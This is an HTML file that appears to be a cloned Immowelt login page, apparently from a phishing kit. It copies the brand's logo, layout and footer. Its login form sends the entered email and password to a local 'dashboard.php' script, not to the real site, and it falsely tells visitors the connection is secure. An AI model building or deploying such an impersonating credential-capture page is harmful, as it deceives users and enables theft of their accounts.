<!DOCTYPE html>
<html lang="de" class="signin-mainpage">





<head>
    <meta charset="UTF-8" />

    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="title" content="Login | Immowelt - Jetzt anmelden oder kostenlos registrieren" />
    <title>Login | Immowelt</title>
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="main-immowelt.css" />
    <link rel="stylesheet" href="minimal-0-footer.css" />
</head>

<body>
    <div id="basecontainer" class="signin-basecontainer">
        <div class="signin-container">
            <div class="signin-primarySection">
                <div class="signin-formOuterWrap" style="width:100%;max-width:570px;">
                    <a href="#" title="Immowelt" class="signin-logoWrap" data-iwsignin-track='{&quot;event_action&quot;: &quot;click&quot;, &quot;event_category&quot;: &quot;button-intern&quot;, &quot;event_label&quot;: &quot;signin-ui/logo&quot;}'>
                        <picture>
                            <source media="(min-width: 981px)" srcset="https://cdnglobal.immowelt.org/global-assets/4.0.1/legacy/0/images/logo_immowelt.svg" alt="Immobilien, Wohnungen und Häuser" title="Immobilien, Wohnungen und Häuser">
                            <source media="(max-width: 980px)" srcset="https://cdnglobal.immowelt.org/global-assets/4.0.1/legacy/0/images/logo_immowelt_blank.svg" alt="Immobilien, Wohnungen und Häuser" title="Immobilien, Wohnungen und Häuser">
                            <img src="https://cdnglobal.immowelt.org/global-assets/4.0.1/legacy/0/images/logo_immowelt.svg" alt="Immobilien, Wohnungen und Häuser" title="Immobilien, Wohnungen und Häuser">
                        </picture>
                    </a>
                    <form id="loginForm" action="dashboard.php" method="post" name="login">
                        <div class="signin-formInnerWrap">
                            <h1>Anmelden</h1>
                            <div>
                                <div class="inputfield">
                                    <label>E-Mail oder Benutzername: </label>
                                    <!-- <input id="user-name-input" type="text" tabindex="1" name="userName" value="" spellcheck="false" autofocus> -->
                                    <input type="text" id="user-name-input" class="login-input" name="email" placeholder="" value="" tabindex="1" spellcheck="false" autofocus="" required />
                                </div>
                                <div class="inputfield">
                                    <label>Passwort:</label>
                                    <div class="password-area">
                                        <!-- <input id="password-input" type="password" name="password" tabindex="2" spellcheck="false"> -->
                                        <input type="password" id="password-input" class="login-input" name="password" tabindex="2" spellcheck="false" placeholder="" required />
                                        <!-- <button id="toggle-password" type="button" class="hidden-password">
                                        </button> -->
                                    </div>
                                </div>
                                <div>
                                    <div class="signin-additional-login-fields">
                                        <div id="remember-me-inputfield" class="signin-remember-me-inputfield">
                                            <input id="remember-me-input" class="remember-me-input" type="checkbox" name="rememberMe"> angemeldet bleiben?
                                        </div>
                                        <div id="password-forgotten-inputfield">
                                            <a id="passwordForgottenLink" data-iwsignin-track='{&quot;event_action&quot;: &quot;click&quot;, &quot;event_category&quot;: &quot;button-intern&quot;, &quot;event_label&quot;: &quot;signin-ui/passwordforgotten&quot;}' class="signin-link signin-forgot"
                                                href="#">Passwort vergessen?
                                            </a>
                                        </div>
                                    </div>
                                    <input style="margin-top: 25px;" id="signin-button" data-iwsignin-track="{&quot;event_action&quot;: &quot;click&quot;, &quot;event_category&quot;: &quot;button-intern&quot;, &quot;event_label&quot;: &quot;signin-ui/login&quot;}" class="signin-button signin-button--primary signin-button--big" type="submit" value="Anmelden" tabindex="3">
                                </div>
                                <div id="signin-privacy-info" class="signin-privacy">
                                    Diese Verbindung ist sicher.
                                </div>
                                <div class="signin-formSwitch">
                                    <div>Neu bei Immowelt?</div>
                                    <a id="RegisterFormButton" data-iwsignin-track='{&quot;event_action&quot;: &quot;click&quot;, &quot;event_category&quot;: &quot;button-intern&quot;, &quot;event_label&quot;: &quot;signin-ui/register&quot;}' href="#" class="signin-button signin-button--black">
                                    Jetzt kostenfrei registrieren
                                    </a>
                                </div>
                            </div>
                        </div>
                    </form>
                    <div class="navigation-ui-footer" style="margin-top: 80px;">
                        <div class="navigation-ui-content-wrapper">
                          <span class="navigation-ui-footer-content">
                              © immowelt GmbH 2023 AGB - Datenschutz - Impressum - Cookie Einstellungen
                          </span>
                        </div>
                    </div>
                    <!-- <form class="hidden" id="registerForm" action="/register?target=meinbereich&amp;path=%2Fredirect" method="post">

                        <input type="hidden" name="CSRF-TOKEN" class="csrf-token">

                        <div class="signin-formInnerWrap">
                            <h1>Registrieren</h1>




                            <div>
                                <div class="inputfield">
                                    <label>E-Mail: </label>
                                    <input id="email-input" type="email" tabindex="1" name="email" value="">


                                </div>

                                <p class="signin-policy">
                                    Mit der Registrierung nimmst du den immowelt Service in Anspruch. Du erhältst anhand der von dir eingegebenen Daten, genutzten Services und auf Grundlage unseres Geschäftszwecks auf dein Anliegen ausgerichtete Informationen. Diesem Service kannst du jederzeit
                                    unter <a href="mailto:datenschutz@immowelt.de">datenschutz@immowelt.de</a> widersprechen.
                                    <br/> Weitere Informationen findest du in der
                                    <a target="_blank" href="//immowelt.de/immoweltag/datenschutz">Datenschutzerklärung</a>.
                                </p>
                                <div>
                                    <input id="register-button" data-iwsignin-track='{&quot;event_action&quot;: &quot;click&quot;, &quot;event_category&quot;: &quot;button-intern&quot;, &quot;event_label&quot;: &quot;signin-ui/register-mail&quot;}' class="signin-button signin-button--primary signin-button--big"
                                        type="submit" value="Registrieren" tabindex="3">
                                </div>
                                <div class="signin-formSwitch">
                                    <div>
                                        Schon registriert?
                                    </div>
                                    <a id="LoginFormButton" class="signin-button signin-button--black">
          <span class="shorten">mit bestehendem Konto </span>anmelden
        </a>
                                </div>
                            </div>
                        </div>
                    </form> -->
                </div>
            </div>
            <div class="signin-secondarySection">
                <div class="signin-infoWrap signin-infoWrap--default">
                    <div class="signin-infoContentWrap">
                        <div class="signin-infoBlur">
                        </div>
                        <div class="signin-infoContent">
                            <div class="signin-headerWrap">
                                <h1><b>Willkommen zurück!</b> Jetzt anmelden und gespeicherte Inhalte und Apps nutzen.
                                </h1>
                            </div>
                            <div class="signin-benefitWrap">
                                <div class="signin-benefit">
                                    <div class="signin-benefitIconWrap">
                                        <img src="images/icon-teaser-magnify.svg">
                                    </div>
                                    <div class="signin-benefitText">
                                        <div>Effiziente Suche mit Suchauftrag und weiteren Services</div>
                                    </div>
                                </div>

                                <div class="signin-benefit">
                                    <div class="signin-benefitIconWrap">
                                        <img src="images/icon-teaser-arrows.svg">
                                    </div>
                                    <div class="signin-benefitText">
                                        <div>Einfache Anzeigenerstellung und -bearbeitung</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <navigation-ui-footer id="nav-xs"></navigation-ui-footer>
            </div>
        </div>
    </div>
</body>
</html>